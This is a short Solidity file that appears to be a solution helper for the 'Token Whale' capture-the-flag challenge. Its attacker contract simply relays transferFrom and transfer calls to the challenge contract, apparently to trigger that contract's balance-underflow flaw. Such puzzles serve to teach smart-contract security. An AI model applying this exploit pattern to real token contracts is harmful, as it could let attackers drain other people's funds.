pragma solidity 0.6.0;

interface ITokenWhaleChallenge {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;

    function transfer(address to, uint256 value) external;
}

contract TokenWhaleAttacker {
    ITokenWhaleChallenge tokenWhale;

    constructor(address _tokenWhale) public {
        tokenWhale = ITokenWhaleChallenge(_tokenWhale);
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public {
        tokenWhale.transferFrom(from, to, value);
    }

    function transfer(address to, uint256 value) public {
        tokenWhale.transfer(to, value);
    }
}
